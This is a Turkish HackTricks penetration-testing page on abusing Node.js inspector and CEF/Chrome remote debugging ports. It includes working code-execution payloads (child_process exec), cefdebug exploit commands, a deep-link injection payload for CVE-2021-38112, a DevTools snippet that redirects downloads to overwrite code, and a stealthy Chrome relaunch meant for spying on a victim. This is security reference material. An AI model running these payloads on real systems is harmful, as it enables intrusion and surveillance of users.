# Node inspector/CEF debug kötüye kullanımı

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

## Temel Bilgiler

[Dökümantasyondan](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started) alıntı: `--inspect` anahtarıyla başlatıldığında, bir Node.js işlemi hata ayıklama istemcisi için dinler. **Varsayılan olarak**, host ve port **`127.0.0.1:9229`** adresinde dinleyecektir. Her işlem ayrıca **benzersiz** bir **UUID** ile ilişkilendirilir.

İstemci denetleyicileri, bağlanmak için host adresini, portu ve UUID'yi bilmeli ve belirtmelidir. Tam bir URL şuna benzer: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
**Hata ayıklayıcının Node.js yürütme ortamına tam erişimi olduğu için**, bu bağlantı noktasına bağlanabilen kötü niyetli bir aktör, Node.js işlemi adına keyfi kod yürütebilir (**potansiyel ayrıcalık yükseltme**).
{% endhint %}

Bir denetleyiciyi başlatmanın birkaç yolu vardır:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
İncelenen bir işlem başlattığınızda şöyle bir şey görünecektir:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) tabanlı işlemler, **hata ayıklayıcıyı** açmak için `--remote-debugging-port=9222` parametresini kullanmalıdır (SSRF korumaları hala benzer şekilde devam eder). Bununla birlikte, bunlar bir **NodeJS hata ayıklama oturumu** yerine, tarayıcıyla iletişim kurmak için [**Chrome DevTools Protokolü**](https://chromedevtools.github.io/devtools-protocol/) kullanır. Bu, tarayıcıyı kontrol etmek için bir arayüzdür, ancak doğrudan bir RCE (Uzaktan Kod Çalıştırma) yoktur.

Hata ayıklanmış bir tarayıcı başlattığınızda, aşağıdaki gibi bir şey görünecektir:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Tarayıcılar, WebSockets ve aynı köken politikası <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Web tarayıcısında açılan web siteleri, tarayıcı güvenlik modeli altında WebSocket ve HTTP istekleri yapabilir. Bir **başlangıç HTTP bağlantısı**, **benzersiz bir hata ayıklama oturum kimliği** elde etmek için gereklidir. **Aynı köken politikası**, web sitelerinin **bu HTTP bağlantısını** yapmasını engeller. [**DNS yeniden bağlama saldırılarına**](https://en.wikipedia.org/wiki/DNS\_rebinding) karşı ek güvenlik için, Node.js, bağlantı için **'Host' başlıklarının** bir **IP adresi** veya **`localhost`** veya **`localhost6`** belirttiğini doğrular.

{% hint style="info" %}
Bu **güvenlik önlemleri**, hata ayıklama aracını **yalnızca bir HTTP isteği göndererek** (bir SSRF zafiyeti kullanılarak yapılabilen) kod çalıştırmak için sömürmeyi engeller.
{% endhint %}

### Çalışan işlemlerde hata ayıklama aracını başlatma

Çalışan bir nodejs işlemine **SİGUSR1 sinyali** gönderebilirsiniz, böylece varsayılan bağlantı noktasında **hata ayıklama aracını başlatabilirsiniz**. Bununla birlikte, yeterli ayrıcalıklara sahip olmanız gerektiğini unutmayın, bu nedenle bu size **işlem içindeki bilgilere ayrıcalıklı erişim** sağlayabilir, ancak doğrudan bir ayrıcalık yükseltme sağlamaz.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
Bu, **bir süreci kapatıp yeni bir tane başlatmanın** mümkün olmadığı konteynerlerde kullanışlıdır çünkü **süreçle birlikte konteyner** öldürülür.
{% endhint %}

### Denetçiye/bilgisayara bağlanma

Bir **Chromium tabanlı tarayıcıya** bağlanmak için, Chrome veya Edge için sırasıyla `chrome://inspect` veya `edge://inspect` URL'lerine erişilebilir. Hedef ana bilgisayar ve bağlantı noktasının doğru bir şekilde listelendiğinden emin olmak için Yapılandır düğmesine tıklanmalıdır. Aşağıdaki resim, Uzaktan Kod Yürütme (RCE) örneğini göstermektedir:

![](<../../.gitbook/assets/image (620) (1).png>)

**Komut satırı** kullanarak bir hata ayıklayıcıya/bilgisayara şu şekilde bağlanabilirsiniz:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Araç [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), yerel olarak çalışan **denetleyicileri bulmayı** ve bunlara **kod enjekte etmeyi** sağlar.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Dikkat: **NodeJS RCE saldırıları**, [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) üzerinden tarayıcıya bağlandığında çalışmaz (ilginç şeyler yapmak için API'yi kontrol etmeniz gerekmektedir).
{% endhint %}

## NodeJS Hata Ayıklama/İnceleyici Üzerinden RCE

{% hint style="info" %}
Eğer [**Electron'da XSS ile RCE nasıl elde edilir**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/) arıyorsanız, lütfen bu sayfaya bakın.
{% endhint %}

Bir Node **inceleyiciye** bağlandığınızda **RCE** elde etmek için yaygın olarak kullanılan bazı yöntemler şunlardır (görünüşe göre bu, **Chrome DevTools protokolüne bağlantıda çalışmayacak**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protokolü Yükleri

API'yi buradan kontrol edebilirsiniz: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
Bu bölümde, bu protokolü kötüye kullanan ilginç şeyleri listeleyeceğim.

### Derin Bağlantılar Aracılığıyla Parametre Enjeksiyonu

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino Security, CEF tabanlı bir uygulamanın sistemde özel bir URI (workspaces://) kaydettiğini keşfetti. Bu URI, tam URI'yi alır ve ardından o URI'den kısmen oluşturulan bir yapılandırmayla CEF tabanlı uygulamayı başlatır.

URI parametrelerinin URL kodlamasının çözümlendiği ve CEF temel uygulamasını başlatmak için kullanıldığı keşfedildi. Bu, bir kullanıcının komut satırına **`--gpu-launcher`** bayrağını enjekte edebilmesine ve keyfi işlemler gerçekleştirebilmesine olanak tanır.

Bu nedenle, aşağıdaki gibi bir yük:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Calc.exe çalıştırılacak.

### Dosyaları Üzerine Yazma

**İndirilen dosyaların kaydedileceği klasörü** değiştirin ve sık kullanılan **uygulamanın kaynak kodunu** **kötü niyetli kodunuzla** üzerine yazmak için bir dosya indirin.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE ve veri sızdırma

Bu yazıya göre: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148), theriver üzerinden RCE elde etmek ve dahili sayfaları veri sızdırmak mümkündür.

### Saldırı Sonrası

Gerçek bir ortamda ve bir kullanıcının Chrome/Chromium tabanlı tarayıcı kullanan bir bilgisayarını **ele geçirdikten sonra**, Chrome işlemi **hata ayıklama etkinleştirilmiş ve hata ayıklama bağlantı noktası yönlendirilmiş** şekilde başlatabilirsiniz, böylece erişebilirsiniz. Bu şekilde, kurbanın Chrome üzerinde yaptığı her şeyi inceleyebilir ve hassas bilgileri çalabilirsiniz.

Gizli bir şekilde, **her Chrome işlemini sonlandırabilir** ve ardından şuna benzer bir şey çağırabilirsiniz:
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Referanslar

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** paylaşın.

</details>
